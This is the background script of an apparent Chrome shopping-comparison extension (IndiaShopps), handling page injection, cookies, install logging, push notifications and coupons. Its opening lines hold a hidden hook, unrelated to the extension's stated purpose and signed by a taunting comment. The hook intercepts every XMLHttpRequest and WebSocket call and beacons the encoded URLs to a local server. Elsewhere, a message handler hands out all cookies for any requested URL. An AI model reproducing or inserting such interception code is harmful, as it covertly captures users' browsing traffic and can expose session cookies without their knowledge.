function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var injectedTabs = {};
chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
	 if(typeof(changeInfo.url)!='undefined')
	{
		if(changeInfo.url.indexOf("flipkart") !== -1 )
		{
			try{
				 chrome.tabs.executeScript(null, { file: "jquery.min.js" }, function() {
					try{
						chrome.tabs.executeScript( tabId, {'file': 'FlipScript.js', runAt: 'document_end'});
					}catch(exp){
						setTimeout(function(){chrome.tabs.executeScript( tabId, {'file': 'FlipScript.js', runAt: 'document_end'});},500);
					}
				});
			}catch(exp){
				chrome.tabs.executeScript(null, { file: "jquery.min.js" }, function() {
					try{
						chrome.tabs.executeScript( tabId, {'file': 'FlipScript.js', runAt: 'document_end'});
					}catch(exp){
						setTimeout(function(){chrome.tabs.executeScript( tabId, {'file': 'FlipScript.js', runAt: 'document_end'});},500);
					}
				});
			}
		}
	}

	if(changeInfo.status == "complete")
	{
		  try{
		 chrome.tabs.executeScript(null, { file: "jquery.min.js" }, function() {
		 chrome.tabs.executeScript(null, { file: "jquery.easing.1.3.js" }, function() {
			try{
					chrome.tabs.executeScript( tabId, {'file': 'product_page.js', runAt: 'document_end'});
			}catch(exp){
				 setTimeout(function(){chrome.tabs.executeScript( tabId, {'file': 'product_page.js', runAt: 'document_end'});},500);
			}
		});
		});
		}catch(exp){
				  setTimeout(function(){ chrome.tabs.executeScript(null, { file: "jquery.min.js" }, function() {
				  chrome.tabs.executeScript(null, { file: "jquery.easing.1.3.js" }, function() {
					chrome.tabs.executeScript( tabId, {'file': 'product_page.js', runAt: 'document_end'});
				});});},500);
		}
	}
});


chrome.extension.onMessage.addListener( function( msg, sender, reply ) {
	switch(msg.cmd) {

		case 'get_cookies': {
			chrome.cookies.getAll({ url: msg.url},function(cookies){
				var Cookies = {};
				for (var i = 0; i < cookies.length; i++)  {
					Cookies[cookies[i].name] = cookies[i].value;
				}
				reply(Cookies);
			});
			return true;
		}
		break;
		case 'get_cookie': {
			var found = false;
			chrome.cookies.getAll({ url: "https://www.indiashopps.com/"},function(cookies){
				var COOKIES = {};
				for( i in cookies ) {
					if( !cookies.hasOwnProperty(i) ) continue;
					if( cookies[i].name == msg.name )
						found = true;
				}
				reply(found);
			});
			return true;
		}
		break;

		case 'update_data':
			update_data( msg.data );
		break;

		case 'update_cookie':
			chrome.cookies.set({ url: msg.url, name: msg.name, value: msg.value, expirationDate: msg.expiry } );
		break;
		case 'remove_cookie':
			for( i in msg.data )
			{
				chrome.cookies.remove({ url: "https://www.indiashopps.com/", name: i} );
			}
		break;
		case 'tab_unload':
			delete injectedTabs[sender.tab.id];
		break;
		case 'open_new': {
			chrome.tabs.create({url:msg.url,active:true});
		}
		break;
		default: return false;
	}
});
// StorageArea.clear();
var api = 'https://ext.yourshoppingwizard.com/log/install.php';
var push_api = 'https://www.indiashopps.com/fcm/save_token';
chrome.runtime.onInstalled.addListener(function (details){
	var manifest = chrome.runtime.getManifest();
	var version = manifest.version;

 chrome.instanceID.getID(function (user_id)
 {
 	var reason=2;
	if(details.reason == 'install')
	{
		reason=1;
	}
 	chrome.storage.local.set({'user_id': user_id}, function(e) { });
	$.post(api,{'reason':reason,'version':version,"user_id": user_id}, function(resp) {
		chrome.storage.local.set({"id":resp}, function(e) { });
	});

     chrome.storage.local.get("registered", function(result) {
         // If already registered, bail out.
         if (result["registered"]){
             // alert("already registred");
             return;
		 }
         // Up to 100 senders are allowed.
         var senderIds = ["87453605717"];
         chrome.gcm.register(senderIds, registerCallback);
     });


  });
});


/*****Notification*****/

chrome.gcm.onMessage.addListener(function(message) {
// alert(message["data"]["id"]);
	var notification_id = message["data"]["id"]+"--"+message["data"]["link"];
	var notification_type = message["data"]["type"];

	if(notification_type == 1){
        var notification_opt = {
            type: "basic",
            title: message["data"]["title"],
            message: message["data"]["text"],
            iconUrl: "icon.png",
						requireInteraction: true,
						buttons:[{title:'Follow URL'},{title:'Remind me Later'}]
        };
    }else if(notification_type == 2) {
        var notification_opt = {
            type: "list",
            title: message["data"]["title"],
            message: message["data"]["text"],
            iconUrl: "icon.png",
            items: message["data"]["items"],
						requireInteraction: true
        };
    }else if(notification_type == 3) {
        var notification_opt = {
            type: "image",
            title: message["data"]["title"],
            message: message["data"]["text"],
            iconUrl: "icon.png",
            imageUrl: message["data"]["imageUrl"],
						requireInteraction: true
        };
    }
    chrome.notifications.create(notification_id, notification_opt, function (notification_id){
    	// alert(notification_id);
		if(chrome.runtime.lastError) {
			alert(chrome.runtime.lastError.message);
		}
	});

    // setTimeout(function(){chrome.notifications.clear(notification_id,function(){});},5000);
});
chrome.notifications.onClicked.addListener(function(notification_id){
	var url = notification_id.split("--");
	// alert(url[1]);
    chrome.tabs.create({ url: url[1] });
});
function registerCallback(push_id) {

    if (chrome.runtime.lastError) {
        return;
    }
    // alert(push_id);
    chrome.storage.local.get("user_id", function(result) {
    	// alert(result["user_id"]);
        $.get(push_api, {'fcm_token': push_id,"user_source":"extension", "source_id": result["user_id"]}, function (resp) {
            chrome.storage.local.set({registered: true});
        });
    });
}


/*****Notification*****/

chrome.tabs.onRemoved.addListener( function(tabId) {
	delete injectedTabs[tabId];
});

function get_data( key, def ) {
	var data = localStorage.data;
	if( !data ) data = '{}';
	data = JSON.parse(data);
	if( typeof key == 'string' ) {
		data = data[key];
	}
	if(data) return data;
	else return def;
}

function update_data( new_data ) {
	var data = get_data();
	for( i in new_data ) {
		data[i] = new_data[i];
	}
	localStorage.data = JSON.stringify(data);
}

function __() {
	if( window['debug'] ) {
		console.log.apply(console,arguments);
	}
}

function parseUrl(url) {
	var a = document.createElement('a');
	a.href = url;
	return {
		'protocol': a.protocol,
		'domain': a.host,
		'path': a.pathname,
		'query': a.search,
		'hash': a.hash
	};
}


function removeWatch(email,vendor,pid)
{
	var rm_url = "https://ext.yourshoppingwizard.com/price_watch/removeFromWatchList.php";
	$.post(rm_url,{email:email,vendor:vendor,pid:pid},function(resp){ });
}
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse){
	// console.log("250"+JSON.stringify(request));
    if(typeof(request.email) != "undefined"){
      if(typeof(localStorage.ext_email)=="undefined" || localStorage.ext_email==""){
        sendResponse({farewell: "No"});
      }
      else {
        sendResponse({farewell: localStorage.ext_email});
      }
    }
    else if(typeof(request.product_id) != "undefined"){
			localStorage[request.product_id] = request.vendor;
    } else if(typeof(request.get_products) != "undefined"){
			if(localStorage[request.get_product_id] == request.vendor)
			{
				sendResponse({out:1,emailtosend:localStorage.ext_email});
			}else{
				sendResponse({out:0});
			}
    }else if(typeof(request.addEmail) != "undefined"){
			localStorage.ext_email = request.addEmail;
    }else if(typeof(request.pid) != "undefined"){
      pid = request.pid;
      email = request.rm_email;
      vendor = request.vendor;
			localStorage[pid] = "";
	  	removeWatch(email,vendor,pid);
    }
 });

/****AutoCoupon****/
chrome.runtime.onConnect.addListener(function(callback) {
	callback.onMessage.addListener(function(data){
		// console.log(JSON.stringify(data));
		data = JSON.parse(data.messageData);
		// console.log((data));
		// console.log(data[0]['type']);
		if(data[0]['type'] == "auto_coupon")
		{
			// var vendor = data[0]['vendor'];
			var query = new Object();
			// query.vendor_name = data[0]['vendor'];
			query.vendor = data[0]['vendor'];
			query.type = "coupon";
				console.log(query);
				// console.log(JSON.parse(query));
			var post_url = "http://elastic-aws.indiashopps.com/composer/site/2.4/deals.php";

			$.post(post_url,{query:JSON.stringify(query)},function(resp)
			{
				if(resp.length)
			 {
				 resp = JSON.parse(resp);
				 resp = resp.return_txt.hits.hits;
				 // console.log(resp.return_txt);
					callback.postMessage({
							dataBack: resp
					});
				}
			});
		}

	});
});
